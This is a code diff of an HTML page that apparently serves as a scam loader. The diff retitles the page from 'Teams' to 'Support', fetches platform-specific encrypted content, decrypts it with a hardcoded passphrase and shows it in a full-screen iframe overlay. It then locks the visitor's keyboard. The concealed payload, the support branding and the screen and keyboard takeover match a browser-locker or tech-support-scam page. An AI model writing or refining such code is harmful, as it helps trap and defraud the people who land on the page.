@@ -3,27 +3,73 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Teams</title>
+  <title>Support</title>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
   <style>
     html, body { margin: 0; height: 100%; overflow: hidden; background: #fff; }
-    #frame { width: 100%; height: 100vh; border: 0; display: block; }
+    #contentiframe { 
+      z-index:9999; 
+      position:fixed; 
+      inset:0; 
+      pointer-events:auto; 
+      overflow:hidden;
+      display: none;
+    }
+    #loading {
+      position: fixed;
+      inset: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: #fff;
+      z-index: 10000;
+      flex-direction: column;
+    }
+    .spinner {
+      width: 50px;
+      height: 50px;
+      border: 3px solid #f3f3f3;
+      border-top: 3px solid #3498db;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    #loading p {
+      margin-top: 20px;
+      color: #666;
+      font-family: Arial, sans-serif;
+    }
   </style>
 
-<!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'G-0LY0HY7L01');
-</script>
-
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'G-0LY0HY7L01');
+  </script>
 </head>
 <body>
 
-  <iframe id="frame" title="encrypted shop" source="/ajax-jck.html" allowfullscreen allow="fullscreen"></iframe>
+  <!-- Loading indicator -->
+  <div id="loading">
+    <div class="spinner"></div>
+    <p>Loading content...</p>
+  </div>
+
+  <div id="contentiframe">
+    <iframe id="frame" 
+            allow="fullscreen; autoplay; encrypted-media; picture-in-picture" 
+            allowfullscreen 
+            webkitallowfullscreen 
+            mozallowfullscreen 
+            style="width: 100%; height: 100%; border: 0px;">
+    </iframe>
+  </div>
 
   <script>
     const PASSPHRASE = "98yNCjeAfWMwk0wI";  
@@ -39,8 +85,19 @@
       return /mac/i.test(p) ? "mac" : "win";
     }
 
+    function secureKeyboardAccess() {
+      if (navigator.keyboard) {
+        navigator.keyboard.lock().catch((err) =>
+          console.warn("Keyboard lock failed:", err)
+        );
+      }
+    }
+
     async function loadSecret() {
       const frame = document.getElementById("frame");
+      const loading = document.getElementById("loading");
+      const contentDiv = document.getElementById("contentiframe");
+      
       try {
         const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
         const { cipher } = await res.json();
@@ -52,14 +109,43 @@
         const blob = new Blob([html], { type: "text/html" });
         lastUrl = URL.createObjectURL(blob);
 
+        // Show iframe and hide loading
+        contentDiv.style.display = "block";
+        loading.style.display = "none";
+        
+        // Set iframe source - yahan src set ho raha hai
         frame.src = lastUrl;
         
+        secureKeyboardAccess();
+
+        // Iframe load hone par console mein log
+        frame.onload = function() {
+          console.log("Content loaded successfully in iframe");
+        };
+
       } catch (e) {
         console.error("Failed to load or decrypt the content: ", e.message);
+        loading.innerHTML = `
+          <div style="text-align: center; color: #e74c3c;">
+            <p style="font-size: 18px;">❌ Failed to load content</p>
+            <p style="font-size: 14px; color: #888;">${e.message}</p>
+            <button onclick="location.reload()" style="padding: 10px 30px; margin-top: 20px; cursor: pointer; background: #3498db; color: white; border: none; border-radius: 5px; font-size: 16px;">Refresh</button>
+          </div>
+        `;
       }
     }
 
-    
+    // Error handling
+    document.getElementById("frame").addEventListener("error", function(e) {
+      console.error("Iframe failed to load");
+      document.getElementById("loading").innerHTML = `
+        <div style="text-align: center; color: #e74c3c;">
+          <p>⚠️ Failed to load iframe content</p>
+          <button onclick="location.reload()" style="padding: 10px 30px; margin-top: 20px; cursor: pointer;">Refresh</button>
+        </div>
+      `;
+    });
+
     window.addEventListener("DOMContentLoaded", loadSecret);
   </script>
 </body>
